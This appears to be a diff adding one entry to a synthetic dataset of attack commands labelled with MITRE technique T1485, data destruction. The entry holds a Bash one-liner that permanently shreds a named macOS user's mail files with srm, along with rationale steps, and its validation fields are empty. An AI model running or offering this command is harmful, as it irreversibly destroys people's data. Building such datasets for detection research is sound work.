@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "find \"/Users/jdoe/Library/Mail\" -type f \\( -name \"*.emlx\" -o -name \"*.mbox\" \\) -exec srm -fP {} +",
+  "explanation": "Wipes mail message and mailbox files for a single user using multi-pass secure deletion.",
+  "rationale_steps": [
+    "Constrain scope to one user\u2019s Mail data to limit collateral impact.",
+    "Select only mail-related file types with find to avoid deleting settings.",
+    "Overwrite with -P and force with -f to ensure permanent deletion."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-532953ca",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
